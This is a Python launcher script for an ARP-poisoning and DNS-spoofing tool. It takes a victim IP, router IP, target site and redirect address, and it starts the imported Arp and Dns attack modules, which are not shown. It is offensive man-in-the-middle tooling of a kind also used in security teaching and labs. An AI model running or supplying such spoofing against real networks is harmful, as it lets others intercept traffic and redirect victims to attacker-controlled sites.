#! /usr/bin/env python3.6
"""Handles arguments and starts dns and arp spoofing."""

import sys
import argparse
import socket
import struct
import os
from arp import Arp
from dns import Dns


def parse_args():
    """Parsed arguments"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--site", help="Site to spoof. Example: -s test.com")
    parser.add_argument("-n", "--newsite", help="(Default local ip) Site to re-route to."
                        + "Example: -n 216.58.218.238")
    parser.add_argument("-v", "--victim", help="Victim IP address. Example: -v 192.168.0.42")
    parser.add_argument("-r", "--router", help="(Default programically get IP) Router IP"
                        + " address. Example: -r 192.168.0.1")
    return parser.parse_args()


def get_router():
    """Gets router ip address if non provided"""
    with open("/proc/net/route") as routes:
        for line in routes:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue
            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))


def main(args):
    """Setups and starts dns and arp spoofing"""
    if os.geteuid():
        sys.exit("Hey! Listen! Run as root!")
    router = args.router or get_router()
    new_site = args.newsite or socket.gethostbyname(socket.gethostname())
    victim = args.victim
    site = args.site
    if not site:
        sys.exit("Please enter site. Example: -s test.com")
    if not victim:
        sys.exit("Please enter victim IP. Example: -v 192.168.0.42")
    poison = Arp(router, victim)
    poison.setup()
    poison.start()

    spoof = Dns(site, new_site)
    spoof.setup()
    # This is blocking
    spoof.start()

    poison.stop()
    sys.exit(0)


if __name__ == "__main__":
    main(parse_args())
